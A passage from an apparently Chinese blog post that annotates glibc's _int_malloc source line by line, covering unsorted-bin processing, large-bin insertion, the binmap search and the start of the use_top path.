unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<br>          <span class="hljs-comment">//更新last_remainer</span><br>          av-&gt;last_remainder = remainder;<br>          <span class="hljs-comment">//设置剩下的chunk的fd和bk</span><br>          remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<br>          <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>          &#123;<span class="hljs-comment">//如果是largechunk, 也设置一下nextsize</span><br>              remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>              remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>          &#125;<br>          <span class="hljs-comment">//设置两个块的标记bit</span><br>          set_head(victim, nb | PREV_INUSE |<br>                               (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head(remainder, remainder_size | PREV_INUSE);<br>          set_foot(remainder, remainder_size);<br>          <span class="hljs-comment">//详细的检查</span><br>          check_malloced_chunk(av, victim, nb);<br>          <span class="hljs-comment">//返回用户指针</span><br>          <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>          alloc_perturb(p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>      &#125;<br></code></pre></td></tr></table></figure><h4 id="else-取出victim-准备放入合适的bin中"><a href="#else-取出victim-准备放入合适的bin中" class="headerlink" title="else 取出victim, 准备放入合适的bin中"></a>else 取出victim, 准备放入合适的bin中</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//如果不满足上面的条件, 就往下执行        /* remove from unsorted list */ //取出了victim        unsorted_chunks(av)-&gt;bk = bck;        bck-&gt;fd = unsorted_chunks(av);</span><br></code></pre></td></tr></table></figure><h4 id="if-exact-fit"><a href="#if-exact-fit" class="headerlink" title="if exact fit"></a>if exact fit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take now instead of binning if exact fit */</span><span class="hljs-comment">//如果有刚好的chunk        if (size == nb)        &#123;            set_inuse_bit_at_offset(victim, size);            if (av != &amp;main_arena)                set_non_main_arena(victim);#if USE_TCACHE            /* Fill cache first, return to user only if cache fills. We may return one of these chunks later.  */            if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)            &#123;                tcache_put(victim, tc_idx);                return_cached = 1;                continue;            &#125;            else            &#123;#endif                check_malloced_chunk(av, victim, nb);                void *p = chunk2mem(victim);                alloc_perturb(p, bytes);                return p;#if USE_TCACHE            &#125;#endif        &#125;</span><br></code></pre></td></tr></table></figure><h4 id="放入small-or-large-bin"><a href="#放入small-or-large-bin" class="headerlink" title="放入small or large bin"></a>放入small or large bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* place chunk in bin */</span><br><span class="hljs-comment">//这一步意味着没有刚好合适的chunk, 所以放入到相应的bin中</span><br>        <span class="hljs-keyword">if</span> (in_smallbin_range(size))<br>        &#123;<span class="hljs-comment">//如果是smallbin</span><br>            victim_index = smallbin_index(size);<br>            bck = bin_at(av, victim_index);<span class="hljs-comment">//bin数组里的chunk指针</span><br>            fwd = bck-&gt;fd;<span class="hljs-comment">//smallbin链表里的第一个chunk</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<span class="hljs-comment">//如果不是的话就是largebin了</span><br>            victim_index = largebin_index(size);<br>            bck = bin_at(av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-comment">//largebin是有顺序的, 要放在合适的位置, 还要设置fd_nextsize等等</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>            &#123;<span class="hljs-comment">//如果largebin为非空</span><br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                <span class="hljs-comment">//如果不是在main_arena呢?看来还是得学一学线程</span><br>                assert(chunk_main_arena(bck-&gt;bk));<br>                <span class="hljs-comment">//chunksize_nomask()直接取出size段, 不用位运算, 所以说speed comparison</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(bck-&gt;bk))<br>                &#123;<span class="hljs-comment">//victim的size小于largebin尾部(bck-&gt;bk)的最小chunk</span><br>                   <span class="hljs-comment">// 令 fwd 指向 large bin 头</span><br>                    fwd = bck;<br>                    <span class="hljs-comment">// 令 bck 指向 largin bin 尾部 chunk</span><br>                    bck = bck-&gt;bk;<br>                    <span class="hljs-comment">// victim 的 fd_nextsize 指向 largin bin 的第一个 chunk</span><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    <span class="hljs-comment">// victim 的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize</span><br>                    <span class="hljs-comment">//原来链表的第一个 chunk 指向的 bk_nextsize是原来最小的(chunk A),</span><br>                    <span class="hljs-comment">//因为这时victim比A小, 所以victim的bk_nextsize肯定是A</span><br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    <span class="hljs-comment">// 原来链表的第一个 chunk 的 bk_nextsize 指向 victim</span><br>                    <span class="hljs-comment">// 原来指向链表第一个 chunk 的 fd_nextsize 指向 victim</span><br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                        <span class="hljs-comment">// 当前要插入的 victim 的大小大于最小的 chunk</span><br>                        <span class="hljs-comment">// 判断 fwd 是否在 main arena</span><br>                        assert(chunk_main_arena(fwd));<br>                        <span class="hljs-comment">// 从链表头部开始找到不比 victim 大的 chunk</span><br>                        <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; chunksize_nomask(fwd)) &#123;<br>                            fwd = fwd-&gt;fd_nextsize;<br>                            assert(chunk_main_arena(fwd));<br>                        &#125;<br>                        <span class="hljs-comment">// 如果找到了一个和 victim 一样大的 chunk，</span><br>                        <span class="hljs-comment">// 那就直接将 chunk 插入到该chunk的后面，并不修改 nextsize 指针。</span><br>                        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size ==<br>                            (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask(fwd))<br>                            <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                            fwd = fwd-&gt;fd;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-comment">// 如果找到的chunk和当前victim大小不一样</span><br><span class="hljs-comment">//就需要构造 nextsize 双向链表,victim指向fwd和后一个(A),A的fd_next指向victim,fwd的bk_next指向victim(最后一行)</span><br>                            <span class="hljs-comment">// 这段真的妙, 我自己写估计得调试出好几个版本</span><br>                            victim-&gt;fd_nextsize              = fwd;<br>                            victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;<br>                            fwd-&gt;bk_nextsize                 = victim;<br>                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                        bck = fwd-&gt;bk;<span class="hljs-comment">//</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-comment">//如果largebin是空的,fd_next和bk_next都指向自己就可以了</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>        &#125;<br>   <span class="hljs-comment">//完成victim的fd和bk指针的修改, 形成fwd--&gt;victim--&gt;bck</span><br>        mark_bin(av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;<span class="hljs-comment">//以上两行将victim插入到相应的链表头部中</span><br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;<span class="hljs-comment">//修改bck的fd指向victim, fwd(即现在的第二个chunk)的bk指向victim</span><br></code></pre></td></tr></table></figure><h4 id="判断iters-大循环结尾"><a href="#判断iters-大循环结尾" class="headerlink" title="判断iters(大循环结尾)"></a>判断iters(大循环结尾)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>        <span class="hljs-comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span><br><span class="hljs-comment"> filling the cache, return one of the cached ones.  */</span><br>        ++tcache_unsorted_count;<br>        <span class="hljs-keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="hljs-number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)<br>        &#123;<br>            <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_ITERS 10000</span><br>        <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<span class="hljs-comment">//unsorted大循环结束, 避免花费过多时间在unsortedbin的处理上</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>    <span class="hljs-comment">/* If all the small chunks we found ended up cached, return one now.  */</span><br>    <span class="hljs-keyword">if</span> (return_cached)<br>    &#123;<br>        <span class="hljs-keyword">return</span> tcache_get(tc_idx);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h3 id="large-request"><a href="#large-request" class="headerlink" title="large request"></a><u>large request</u></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">        sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//回想一下, 循环之前判断了fastbin和smallbin, 到largebin的时候先malloc_consolidate清理fastbin到unsortedbin,</span><br><span class="hljs-comment">//从unsortedbin中一个个取出,历经last_remainer,exact fit和放入相应bin中后, 循环中只判断了从unsortedbin中取出的块</span><br><span class="hljs-comment">//即合并之后的chunk,并且没有一块和nb相等.由于smallbin每个bin大小一致,也就是说两次比较smallbin中都没有合适的chunk,</span><br><span class="hljs-comment">//跳出循环之后直接找 *largechunk* 里的即可, 并且是find smallest that fits, 不一定要刚刚好</span><br>   <span class="hljs-keyword">if</span> (!in_smallbin_range(nb))<br>   &#123;<br>       bin = bin_at(av, idx); <span class="hljs-comment">//idx是nb定位出来的idx,在大循环之前,到这里说明是largebin_idx</span><br><br>       <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>       <span class="hljs-keyword">if</span> ((victim = first(bin)) != bin &amp;&amp; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)chunksize_nomask(victim) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb))<br>       &#123;<span class="hljs-comment">//如果该largebin非空 且 最大的不小于nb</span><br>           <span class="hljs-comment">//为了反向遍历,victim指向最后一个最小的largechunk</span><br>           victim = victim-&gt;bk_nextsize;<br>           <span class="hljs-comment">//找出第一个不小于nb的块, 并且赋值size为这个chunk的大小</span><br>           <span class="hljs-comment">//如果有多个相同大小的chunk, victim会定位到第一个有fd_nextsize指针的chunk</span><br>           <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size = chunksize(victim)) &lt;(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb)))<br>               victim = victim-&gt;bk_nextsize;<br><br>           <span class="hljs-comment">//如果从largebin链表中选取的victim不是链表中的最后一个chunk,并且与victim大小相同的chunk不止一个</span><br>           <span class="hljs-comment">//意味着victim为chunk size链表中的节点</span><br>           <span class="hljs-comment">//为了避免调整chunksize链表, 将victim的fd作为候选chunk</span><br>           <span class="hljs-keyword">if</span> (victim != last(bin) &amp;&amp; chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))<br>               victim = victim-&gt;fd;<br>           <br>   <span class="hljs-comment">//准备分割,unlink取出victim</span><br>           remainder_size = size - nb;<br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//如果剩下的小于MINSIZE就把整个victim给出去</span><br>               <span class="hljs-comment">//例行设置inuse_bit和non_main_arena_bit</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><span class="hljs-comment">//如果过大就要分割</span><br>           &#123;<br>               remainder = chunk_at_offset(victim, nb);<span class="hljs-comment">//取出剩下的chunk指针, 前面写过相关过程</span><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               <span class="hljs-comment">//插入unsortedbin头部</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<span class="hljs-comment">//简单的检查,防止fwd被篡改</span><br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<span class="hljs-comment">//插入完成</span><br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<span class="hljs-comment">//largebin就设置一下</span><br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           <br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h3 id="Search-for-next-largest-bin"><a href="#Search-for-next-largest-bin" class="headerlink" title="Search for next largest bin"></a>Search for next largest bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Search for a chunk by scanning bins, starting with next largest</span><br><span class="hljs-comment">        bin. This search is strictly by best-fit; i.e., the smallest</span><br><span class="hljs-comment">        (with ties going to approximately the least recently used) chunk</span><br><span class="hljs-comment">        that fits is selected.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        The bitmap avoids needing to check that most blocks are nonempty.</span><br><span class="hljs-comment">        The particular case of skipping all bins during warm-up phases</span><br><span class="hljs-comment">        when no chunks have been returned yet is faster than it might look.</span><br><span class="hljs-comment">      */</span><br><span class="hljs-comment">//fastbin,smallbin中刚好的--&gt;fastbin合并后+unsortedbin中刚好的--&gt;用nb定位的largebin_idx中不小于的</span><br><span class="hljs-comment">//以上这些全部失败之后进行下面的操作,寻找比当前idx更大的idx</span><br>   ++idx;<span class="hljs-comment">//直接+1</span><br>   bin = bin_at(av, idx);<br><span class="hljs-comment">//使用bitmap能够避免循环判断+1后的idx指向的链表是不是空的</span><br><span class="hljs-comment">//除了mark_bin unmark_bin get_binmap其他binmap函数都不涉及 binmap数组, 只是单纯的移位运算</span><br>   block = idx2block(idx);<span class="hljs-comment">//算出block</span><br>   <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<span class="hljs-comment">//取出map</span><br>   bit = idx2bit(idx);<span class="hljs-comment">//算出该位的bit</span><br><br>   <span class="hljs-keyword">for</span> (;;)<br>   &#123;<span class="hljs-comment">//大循环,找到后 or 没有--&gt;(goto use_top)</span><br>       <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>       <span class="hljs-comment">//Skip rest of block if there are no more set bits in this block.</span><br>       <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>       &#123;<span class="hljs-comment">//当前bit为0 或者 chunk后面的bit也等于0(bit &gt; map), idx2bit()不可能得到0,应该是循环下面的部分</span><br>           <span class="hljs-keyword">do</span><br>           &#123;<br>               <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                   <span class="hljs-keyword">goto</span> use_top;<span class="hljs-comment">//没有的话只能够使用top chunk了</span><br>           &#125; <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<span class="hljs-comment">//不等零</span><br><br>           bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));<span class="hljs-comment">//取到了更大且非空的bin</span><br>           bit = <span class="hljs-number">1</span>;<br>       &#125;<br><br>       <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>       <span class="hljs-comment">//1.没有经过上面的if,原map中就大于等于bit, 从原bit位开始左移</span><br>       <span class="hljs-comment">//2.经过了上面的if,bit从最低位开始左移</span><br>       <span class="hljs-comment">//从bit位开始找bin header, 肯定是存在的</span><br>       <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>       &#123;<br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>           assert(bit != <span class="hljs-number">0</span>);<br>       &#125;<br><br>       <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>       <span class="hljs-comment">//既然比nb都大, 就选一个最右边的, 这样在largebin中还是最小的</span><br>       victim = last(bin);<br><br>       <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>       <span class="hljs-comment">// 如果victim=bin，那么我们就将map对应的位清0，然后获取下一个bin</span><br>       <span class="hljs-comment">// 这种情况发生的概率应该很小。</span><br>       <span class="hljs-keyword">if</span> (victim == bin)<br>       &#123;<br>           av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>           bin = next_bin(bin);<br>           bit &lt;&lt;= <span class="hljs-number">1</span>;<br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<br>           size = chunksize(victim);<br><br>           <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>           assert((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb));<br>           <br>           remainder_size = size - nb;<br><br>           <span class="hljs-comment">/* unlink */</span><br>           unlink(av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>           &#123;<span class="hljs-comment">//不够就整块送出去</span><br>               set_inuse_bit_at_offset(victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   set_non_main_arena(victim);<br>           &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>           &#123;<span class="hljs-comment">//够了就分割</span><br>               remainder = chunk_at_offset(victim, nb);<br><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks(av);<br>               fwd = bck-&gt;fd;<br>               <span class="hljs-keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))<br>               &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br><br>               <span class="hljs-comment">/* advertise as last remainder */</span><br>               <span class="hljs-comment">// 如果在small bin范围内，就将其标记为remainder</span><br>               <span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>                   av-&gt;last_remainder = remainder;<br>               <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size))<br>               &#123;<br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>               &#125;<br>               set_head(victim, nb | PREV_INUSE |<br>                                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head(remainder, remainder_size | PREV_INUSE);<br>               set_foot(remainder, remainder_size);<br>           &#125;<br>           check_malloced_chunk(av, victim, nb);<br>           <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>           alloc_perturb(p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br>    <span class="hljs-comment">/*   没看懂写了啥(replenished,fenceposts)</span><br><span class="hljs-comment">         If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">         search rule.  In effect, 